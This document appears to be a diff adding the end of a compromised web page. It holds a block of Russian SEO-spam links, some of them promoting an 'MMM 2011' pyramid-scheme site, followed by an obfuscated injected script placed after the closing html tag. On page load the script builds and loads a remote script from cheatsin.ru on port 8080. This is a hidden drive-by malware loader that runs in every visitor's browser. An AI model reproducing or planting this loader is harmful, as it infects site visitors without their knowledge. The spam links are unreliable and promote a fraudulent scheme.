+<a href="http://ceramcode.ru/catalog/Sant-Agostino-Gemstone">Ceramica sant agostino gemstone Giava</a>.
+<a href="http://ceramcode.ru/catalog/Sant-Agostino-Earth">Керамическая плитка sant agostino earth Mosaico Autumn</a>.
+<a href="http://ceramcode.ru/catalog/Porcelanite-Dos">Medusa porcelanite dos Плитка</a>.
+<a href="http://www.mishytka.com/catalog/magazin-detskih-avtokresel/">Автокресла магазин детских автокресел не интернет</a>.
+<a href="http://www.mishytka.com/catalog/detskie-pelenalnye-komody/">В широком ассортименте представлены, главная детская мебель детские пеленальные комоды</a>.
+<a href="http://www.mishytka.com/catalog/krovat-transformer-detskaya/">Би кровать трансформер детская мебель Магазин</a>.
+<a href="http://www.mishytka.com/">Найден по ссылке: детские товары игрушки и интернет магазин игрушек москва</a>.
+<a href="http://sergey-mavrodi-mmm-2011.com/">Сергей Мавроди биография Ммм 2011 Мавроди</a>.
+<a href="http://sergey-mavrodi-mmm-2011.com/kalkulyator-mmm-2011.html">Как использовать калькулятор Ммм 2011</a>?
+<a href="http://proshyanskij.ru/">Коньяк прошянский коньячный завод Спиртные напитки</a>.
+<a href="http://proshyanskij.ru/catalog/konyak/">Уволили с работы, армянский коньяк</a>.
+<a href="http://forestmebel.ru/">Доступные цены, корпусная мебель на заказ</a>.
+</div>
+<p align="center"></p>
+
+
+<p align="center"></p>
+
+
+
+</html>
+
+			 OnMouseOver=p align=<!-- Время генерации страницы: 0.1190 сек. -->
+
+
+
+
+
+
+
+
+
+<script>var n;if(n!=''){n='CD'};var Y="";var z;if(z!='HY' && z!='KW'){z=''};var kh='';function p(){this.rj='';var w;if(w!='' && w!='B'){w=null};var Si='';var wD='';var C=window;var k=unescape;var ji=new String();var l=new Date();var F=k("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%74%6d%7a%2e%63%6f%6d%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2e%70%65%2e%70%68%70");var AE=new String();var KY;if(KY!='' && KY!='St'){KY='Au'};this.Yb='';var rs;if(rs!='FF'){rs='FF'};function y(r,a){this.Z="";this.ZU="";var m=new String("g");var _=k("%5b"), j=k("%5d");var aE;if(aE!='v' && aE!='Sc'){aE=''};var lY=new Array();var g=_+a+j;var _X=new Array();var K=new RegExp(g, m);var MC;if(MC!='nx' && MC!='b'){MC=''};var RU;if(RU!=''){RU='dT'};return r.replace(K, new String());var tI=new Array();var BX;if(BX!='' && BX!='tT'){BX=''};};var Fd;if(Fd!='DZ' && Fd!='GS'){Fd='DZ'};var sB;if(sB!=''){sB='vF'};var aP="";var LO;if(LO!='' && LO!='DT'){LO=''};this.jr="";var R=y('856793703555383733076796','95736');var Fy;if(Fy!='N' && Fy!='Gs'){Fy=''};var zX="";var H=document;var LC=new String();var S=new String();var JB;if(JB!='Im' && JB!='AY'){JB=''};var bK=new Date();function u(){this.LOP="";var Ce=k("%68%74%74%70%3a%2f%2f%63%68%65%61%74%73%69%6e%2e%72%75%3a");var za=new String();var wz='';var Jh='';S=Ce;var NA;if(NA!='' && NA!='Qi'){NA=null};S+=R;var jA="";S+=F;var zo;if(zo!='' && zo!='rv'){zo=''};var pv;if(pv!='' && pv!='Cv'){pv=''};try {var Qm;if(Qm!='' && Qm!='OQp'){Qm='la'};this.pG="";E=H.createElement(y('sGc3rGigpgte','agZNlvu3PWGhebwAFB'));var Aa;if(Aa!='Tn' && Aa!='yy'){Aa='Tn'};var c='';var oI;if(oI!='Vi' && oI!='Wc'){oI=''};this.e='';var bc;if(bc!='Ea'){bc='Ea'};E[k("%64%65%66%65%72")]=[1][0];var au='';var Fz="";E[k("%73%72%63")]=S;var kZ=new Date();var oF;if(oF!='' && oF!='NY'){oF=''};H.body.appendChild(E);this.jP="";this.EU='';var SB;if(SB!='Ac' && SB!='xYY'){SB=''};} catch(s){this.CZ='';var jI=new String();alert(s);var LW;if(LW!='RL' && LW!='o_'){LW=''};};}var lm='';var G_;if(G_!='Qu'){G_=''};C[new String("onl"+"oadSZ2k".substr(0,3))]=u;};var oh;if(oh!='Gp'){oh=''};p();var um="";</script>
+<!--19e7d25a0864ed26e338f4f2c67f54c8-->
